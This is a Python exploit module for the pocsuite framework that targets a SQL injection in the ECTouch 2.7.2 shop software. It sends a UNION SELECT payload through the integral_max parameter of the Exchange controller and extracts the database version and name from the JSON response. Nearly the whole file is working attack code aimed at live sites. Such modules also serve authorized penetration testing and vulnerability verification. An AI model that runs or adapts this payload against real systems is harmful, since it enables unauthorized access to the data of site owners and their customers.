#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
import json
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    name = 'ECTOUCH_Core_2.7.2__SQL_Injection_Vulnerability sql injection Vulnerability'
    vulID = '0'
    author = ['cws6']
    vulType = 'sql-inj'
    version = '1'
    references = ['https://www.anquanke.com/post/id/169152']
    desc = '''ECTOUCH_Core_2.7.2__SQL_Injection_Vulnerability 前台存在sql注入'''

    vulDate = '2019-01-04'
    createDate = '2019-04-08'
    updateDate = '2019-04-08'

    appName = 'ectouch'
    appVersion = '2.7.2'
    appPowerLink = 'http://www.ectouch.cn'
    samples = ['re']

    
    def _attack(self):
        """attack mode"""
        result = {}
        payload1 = '/index.php?c=Exchange&a=asynclist_list&integral_max=1.0union select 1,version(),3,4,5,database(),7,8,9,10,11 order by goods_id asc%23'
        resp = req.get(self.url + payload1)
        time.sleep(2)
        resp_json = json.loads(resp.content)
        dbname1 = resp_json['list'][0]['exchange_integral']
        if dbname1:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['Database'] = {}
            result['Database']['DBname'] = dbname1
        return self.parse_output(result)

    def _verify(self):
        """verify mode"""
        result = {}
        payload1 = '/index.php?c=Exchange&a=asynclist_list&integral_max=1.0union select 1,version(),3,4,5,database(),7,8,9,10,11 order by goods_id asc%23' 
        resp = req.get(self.url + payload1)
        time.sleep(2)
        if resp:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)

